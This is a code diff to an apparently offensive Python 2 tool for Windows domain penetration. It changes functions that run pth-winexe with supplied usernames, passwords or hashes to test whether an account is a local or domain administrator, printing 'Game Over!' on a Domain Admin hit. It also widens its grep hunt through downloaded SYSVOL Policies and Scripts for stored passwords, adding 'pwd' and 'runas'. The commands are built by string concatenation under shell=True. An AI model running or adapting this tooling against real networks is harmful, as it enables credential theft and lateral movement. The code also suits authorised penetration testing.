@@ -847,7 +847,7 @@ def checkport():
 	else:
 		print colored("[+]Looks like a Domain Controller",'green')
 
-def get_local_admins(ip,username,password):
+def get_local_admins(ip,username,password,domain):
 	
 	LocalAdmin=False
 
@@ -855,7 +855,7 @@ def get_local_admins(ip,username,password):
 		print colored("[-]Username is missing..",'red')
 		exit(1)
 	else:
-		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+ip+" 'net localgroup administrators' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net localgroup administrators' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 		stdout_value = proc.communicate()[0]
 		if username in stdout_value:
 			LocalAdmin = True
@@ -863,7 +863,7 @@ def get_local_admins(ip,username,password):
 	return LocalAdmin	
 
 
-def get_domain_admins(ip,username,password):
+def get_domain_admins(ip,username,password,domain):
 	
 	DomainAdmin=False
 
@@ -871,7 +871,7 @@ def get_domain_admins(ip,username,password):
 		print colored("[-]Username is missing..",'red')
 		exit(1)
 	else:
-		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 		stdout_value = proc.communicate()[0]
 		
 		if username in stdout_value:
@@ -881,8 +881,8 @@ def get_domain_admins(ip,username,password):
 
 
 def run():
-	user=args.username
-	passw=args.password
+	user=args.username.strip()
+	passw=args.password.strip()
 	
 	for target in targets:
 
@@ -919,13 +919,13 @@ def run():
 					print colored("[+]"+host+" Creds OK, User Session Granted",'green')
 					
 					#Check if account is a local admin
-					if get_local_admins(host,user,passwd):
+					if get_local_admins(host,user,passwd,domain_name):
 						print colored("[+]"+host+" Account is a Local Admin",'green')
 					else:
 						print colored("[-]"+host+" Account not found in Local Admin Group",'yellow')
 
 					#Check if account is a Domain Admin
-					if get_domain_admins(host,user,passwd):
+					if get_domain_admins(host,user,passwd,domain_name):
 						print colored("[+]"+host+" Account is a Domain Admin",'green') + colored(" Game Over!",'red')
 					else:
 						print colored("[-]"+host+" Account not found in Domain Admin Group",'yellow')
@@ -2032,7 +2032,7 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 			
 			checkport()
 
-			print colored("[+]Attempting to download contents of Policies and scripts from sysvol and search for administrator and password:",'yellow')
+			print colored("[+]Attempting to download contents of Policies and Scripts from sysvol and search for administrator and password:",'yellow')
 
 			if not os.path.isdir(outputpath+targets[0]):
 				os.makedirs(outputpath+targets[0])
@@ -2052,7 +2052,9 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 					os.system("grep --exclude=netuser.txt -ri \"net user\" > netuser.txt")
 					os.system("grep --color='auto' -ri administrator")
 					os.system("grep --color='auto' -ri password")
-					
+					os.system("grep --color='auto' -ri pwd")
+					os.system("grep --color='auto' -ri runas")
+
 					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt'):
 							#If file is available parse it
 						print colored("[+]Excellent we have found \'net user\' in scripts... "+outputpath+targets[0]+'/scripts/','green')
